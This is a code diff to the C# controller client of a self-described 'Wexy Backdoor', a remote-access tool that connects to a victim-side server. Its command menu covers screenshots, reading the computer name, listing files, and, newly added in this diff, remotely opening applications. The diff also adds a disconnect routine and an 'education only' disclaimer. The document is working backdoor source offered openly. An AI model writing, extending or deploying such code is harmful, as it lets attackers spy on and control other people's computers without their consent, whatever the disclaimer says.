@@ -21,7 +21,7 @@ namespace Wexy_Client
                 {
                     //Creates a packet to hold the command, and gets the bytes from the string variable
                     byte[] Packet = Encoding.ASCII.GetBytes(Command);
-
+                    
                     //Send the command over the network
                     Writer.Write(Packet, 0, Packet.Length);
 
@@ -69,7 +69,9 @@ namespace Wexy_Client
             }
         }
 
-        //TODO
+        /// <summary>
+        /// Receive sent by the server.
+        /// </summary>
         public static void ReceiveData()
         {
             //Infinite loop 
@@ -88,15 +90,16 @@ namespace Wexy_Client
                     Receiver.Flush();
 
                     //Convert the packet into readable string
-                    string command = Encoding.ASCII.GetString(RecPacket);
+                    string data = Encoding.ASCII.GetString(RecPacket);
 
-                    //Split the command into two different strings based on the splitter we made, >
-                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(command, ">");
+                    /* Split the command into two different strings based on the splitter we made, >
+                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(data, ">");
 
                     //Get the actual command.
-                    command = CommandArray[0];
-                    pcname = command;
-                    files = command;
+                    data = CommandArray[0]; */
+
+                    pcname = data;
+                    files = data;
                     break;
                 }
                 catch
@@ -115,7 +118,9 @@ namespace Wexy_Client
             //The TcpClient that we will use for the connection.
             TcpClient Connector = new TcpClient();
 
-            Console.WriteLine("Wexy Backdoor - Made by mem0rYLaek");
+            Console.WriteLine("Wexy backdoor - Made by mem0rYLaek");
+            Console.WriteLine("This program was made for education and training purpose only.");
+            Console.WriteLine("I'm not responsible for any damage caused by the usage of this application.\n");
             //Get the user to enter IP of the server.
             Console.WriteLine("Enter server IP :");
             string IP = Console.ReadLine();
@@ -154,12 +159,32 @@ namespace Wexy_Client
                     Console.WriteLine("- (Take a screenshot) 'ss>'");
                     Console.WriteLine("- (Get target's computer name) 'pcname>'");
                     Console.WriteLine("- (Show files in a specified folder path) 'showfiles>'");
+                    Console.WriteLine("- (Open application) 'openApp>application_name'");
+                    Console.WriteLine("- (Disconnect) 'disconnect'");
+                    
+                }
+                else if (command == "disconnect")
+                {             
+                    try
+                    {
+                        //Connector.Client.Shutdown(SocketShutdown.Both);
+                        Connector.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
+                        //If I set this to false, I can't reconnect -_-
+                        Connector.Client.Disconnect(true);
+                        Connector.Close();
+                        Console.WriteLine("You were disconnected from the server");
+                    }
+                    catch(Exception ex)
+                    {
+                        Console.WriteLine("Unable to disconnect :" + ex.Message);
+                    }
                 }
                 else
                 {
                     SendCommand(command);
                 }
             }
+            Environment.Exit(0);
         }//end main
     }//End class client
 }
